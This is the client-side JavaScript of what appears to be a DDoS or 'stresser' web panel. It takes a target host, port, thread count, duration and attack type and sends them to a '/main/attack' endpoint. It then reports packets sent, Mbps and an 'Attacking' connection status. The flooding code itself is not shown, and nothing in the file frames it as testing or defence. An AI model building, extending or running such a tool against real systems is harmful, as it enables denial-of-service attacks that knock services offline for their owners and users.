document.addEventListener('DOMContentLoaded', () => {
  const targetInput = document.getElementById('target');
  const portInput = document.getElementById('port');
  const threadsInput = document.getElementById('threads');
  const durationInput = document.getElementById('duration');
  const attackSelect = document.getElementById('attackType');
  const startButton = document.getElementById('startAttack');
  const statusDisplay = document.getElementById('status');
  const mbpsDisplay = document.getElementById('mbps');
  const packetsSentDisplay = document.getElementById('packetsSent');
  const connectionStatusDisplay = document.getElementById('connectionStatus');
  const timeElapsedDisplay = document.getElementById('timeElapsed');

  let attackStartTime;
  let packetsSent = 0;

  const updateStatus = (message) => {
    statusDisplay.textContent = message;
  };

  const updateStats = (mbps, packets, connectionStatus, timeElapsed) => {
    mbpsDisplay.textContent = `MBPS: ${mbps}`;
    packetsSentDisplay.textContent = `Packets Sent: ${packets}`;
    connectionStatusDisplay.textContent = `Connection: ${connectionStatus}`;
    timeElapsedDisplay.textContent = `Time: ${timeElapsed}`;
  };

  const startAttack = async () => {
    const target = targetInput.value;
    const port = parseInt(portInput.value);
    const threads = parseInt(threadsInput.value);
    const duration = parseInt(durationInput.value);
    const attackType = attackSelect.value;

    if (!target) {
      updateStatus('Error: Target is required.');
      return;
    }

    attackStartTime = Date.now();
    packetsSent = 0;
    updateStats(0, 0, 'Starting...', 0);

    const statusCallback = (data) => {
      if (data.status === 'packet_sent') {
        packetsSent = data.packets;
        const timeElapsed = (Date.now() - attackStartTime) / 1000;
        const mbps = (packetsSent * 1000) / timeElapsed / 1000000;
        updateStats(mbps.toFixed(2), packetsSent, 'Attacking', timeElapsed.toFixed(2));
      } else if (data.status === 'thread_connected') {
        updateStatus(`Thread ${data.thread} connected.`);
      } else if (data.status === 'thread_error' || data.status === 'socket_error') {
        updateStatus(`Error: ${data.error}`);
      } else if (data.status === 'flood_stopped') {
        const timeElapsed = (Date.now() - attackStartTime) / 1000;
        updateStatus(`Attack stopped. Total packets sent: ${data.packets}`);
        updateStats(0, data.packets, 'Stopped', timeElapsed.toFixed(2));
      } else if (data.status === 'starting') {
        updateStatus('Attack starting...');
      }
    };

    try {
      const response = await fetch('/main/attack', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ target, port, threads, duration, attackType }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        updateStatus(`Attack failed: ${errorData.error}`);
        updateStats(0, 0, 'Failed', 0);
        return;
      }

      updateStatus('Attack initiated...');

    } catch (error) {
      console.error('Error:', error);
      updateStatus(`Attack failed: ${error.message}`);
      updateStats(0, 0, 'Failed', 0);
    }
  };

  startButton.addEventListener('click', startAttack);
});